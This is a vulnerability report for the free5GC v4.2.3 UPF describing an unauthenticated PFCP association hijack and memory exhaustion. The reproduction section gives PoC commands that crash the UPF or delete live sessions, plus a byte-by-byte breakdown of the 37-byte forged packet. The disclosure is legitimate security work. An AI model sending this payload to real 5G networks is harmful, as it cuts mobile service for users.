title: [Bugs] Unauthenticated PFCP Association Hijack & Permanently Unreclaimable `s.rnodes` Growth
body:
## Bug Description

A missing authentication vulnerability exists in the free5GC v4.2.3 UPF PFCP Association Setup handling. The UPF identifies PFCP peers only by the attacker-controlled Node ID and does not verify the packet source against the address of an existing association.

An unauthenticated attacker with network access to UDP/8805 can send a forged PFCP Association Setup Request using the Node ID of the legitimate SMF. The UPF then deletes the existing SMF association and all associated PFCP sessions before rebinding the Node ID to the attacker's source address. A single forged packet can therefore terminate active user-plane sessions and cause a persistent denial of service.

The same unauthenticated interface also accepts unlimited distinct Node IDs without removing stale associations. Repeated Setup Requests can continuously grow the UPF peer table and consume memory until the process is terminated by the OOM killer.

## To Reproduce

Prerequisites: a running free5GC v4.2.3 Docker stack with the SMF↔UPF PFCP association established and one UE registered with two PDU sessions (so there is live user-plane state to destroy). The PoC is pure Python 3 standard library (no dependencies).

1. **Deploy & gate end-to-end health.** Bring up the free5GC v4.2.3 compose stack, drive one UE to registration + two PDU sessions (`uesimtun0`/`uesimtun1` up), and confirm the SMF→UPF association exists. In this deployment the SMF Node ID is `smf.free5gc.org` and the UPF N4 endpoint is `upf.free5gc.org:8805` (10.100.200.3).

2. **Resolve the UPF N4 address** (docker re-assigns IPs across `down`/`up` cycles):
   ```bash
   UPF_IP=$(docker inspect upf --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
   ```

3. **Run the PoC** (`upf_assoc_hijack_poc.py`, Python 3 stdlib only — full source in [`pkgs/README.md`](README.md) §Complete PoC):
   ```bash
   # (a) Resource-exhaustion / leak: N distinct Node IDs -> N permanently unreclaimable s.rnodes entries
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak  --count 100000
   #     -> 100000/100000 accepted in ~22.4s, RSS 8.1->144 MiB, delete_node=0  (DESTRUCTIVE: memory)

   # (a-oom) OOM-crash variant: cap the UPF container at 2 GB, then send ~2 M distinct Node IDs
   docker update --memory 2g --memory-swap 2g upf
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --report-every 50000
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --leak-prefix leak2 --report-every 100000
   #     -> phase 1: 1M accepted, RSS 15->1 288 MB;  phase 2: RSS -> 2 091 MB -> kernel OOM kill
   #        (exit=137, OOMKilled=true, restarts=0; ~1.27 KiB per association)

   # (b) Hijack / mass teardown: ONE 37-byte datagram destroys all sessions of smf.free5gc.org
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --node-id smf.free5gc.org
   #     -> Cause=Request accepted; UPF logs "delete node ... sess:map[0x1,0x2]" + "sess deleted"x2 + "New node";
   #        loss 0%->100%, persists across UPF restart  (DESTRUCTIVE: user plane)

   # inspect the exact bytes without sending anything
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --dry-run
   ```

**The 37-byte attack datagram** (`--mode hijack --node-id smf.free5gc.org`):

```
20 05 00 21 00 00 01 00  00 3c 00 11 02 03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67 00 60 00 04 ee 52 08 a0
```

| Offset | Bytes | Meaning |
|---|---|---|
| 0 | `20` | PFCP v1, `S=0` (node-related, no SEID) |
| 1 | `05` | Message Type 5 = Association SetupRequest |
| 2-3 | `00 21` | Message Length = 33 (total 37) |
| 4-6 | `00 00 01` | Sequence Number = 1 |
| 7 | `00` | Spare |
| 8-9 | `00 3c` | IE Type 60 = **Node ID** |
| 10-11 | `00 11` | IE Length = 17 |
| 12 | `02` | Node ID Type = **FQDN** |
| 13-28 | `03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67` | length-prefixed `smf.free5gc.org` (**no** root terminator, matching go-pfcp) |
| 29-30 | `00 60` | IE Type 96 = **Recovery Time Stamp** |
| 31-32 | `00 04` | IE Length = 4 |
| 33-36 | `ee 52 08 a0` | Time stamp (decoded at `:42` and **discarded**) |

**Observed** (UPF returns acceptance in ~11 ms): `msg_type=6` (Association Setup Response), `cause=1 (Request accepted)`, `upf_node_id=upf.free5gc.org`. UPF log signature (the smoking gun): `delete node: &pfcp.RemoteNode{ID:"smf.free5gc.org", ..., sess:map[uint64]struct{}{0x1:..., 0x2:...}}` → `[CPSEID:0x1] sess deleted` → `[CPSEID:0x2] sess deleted` → `[CPNodeID:smf.free5gc.org] New node`. **Critical negative signature:** no `panic`, no `fatal`, no signal, no restart — `upf` stays `running`, `RestartCount=0`. Reproducibility: **4/4 = 100%** (hijack 2/2, leak 2/2) across full environment rebuilds.


## Screenshots

None

## Environment

- **free5GC Version:** v4.2.3 — `free5gc/upf:v4.2.3` (image digest `sha256:b1c4e6967db6e244b43c0cbe5bba498d3a55e506c580134ca131f5ee6df99c75`); source tree `v4.2.3-4-g387710d`, `internal/pfcp/association.go` has the identical vulnerable block at `:48-58` and no-op Release/Update at `:76-88`
- **Deployment:** Docker-based 5G Core Network (free5GC basic compose, 16 containers, N4 on bridge `10.100.200.0/24`; UPF N4 `upf.free5gc.org:8805` = 10.100.200.3; SMF Node ID `smf.free5gc.org`)
- **OS:** Ubuntu 22.04 Desktop
- **Kernel version:** 138~22.04.1-Ubuntu
- **go version:** 1.21.8 linux/amd64

## Trace Files

[Artifacts](https://media.githubusercontent.com/media/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260916-POC/packages.zip) present in this repository:

- `upf_assoc_hijack_poc.py`— the PoC (Python 3 stdlib; modes `hijack`/`leak`).
- `pcap/`— N4 PCAP capture (excluding SSH port 22) of the v4.2.3 hijack reproduction: `hijack.pcap` — the 37-byte attack datagram, the UPF's acceptance response, then silence (`hijack-tcpdump.txt` holds the capture stats).
- `logs/`— trimmed logs of the v4.2.3 hijack reproduction: `hijack-upf.log` (post-attack lines only: forged `handleAssociationSetupRequest` → `delete node` → `sess deleted` ×2 → `New node`) and `hijack-smf.log` (last 200 lines; its final entry, 12:56:11, is six seconds **before** the 12:56:17 attack — the SMF logged **zero** entries at/after it).


## Additional Context

- **Vulnerability Type:** Resource Exhaustion (Denial of Service). 
- **CWE:** CWE-306 (Missing Authentication for Critical Function, primary)
- **CVSS v4 (report assessment):**
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H`
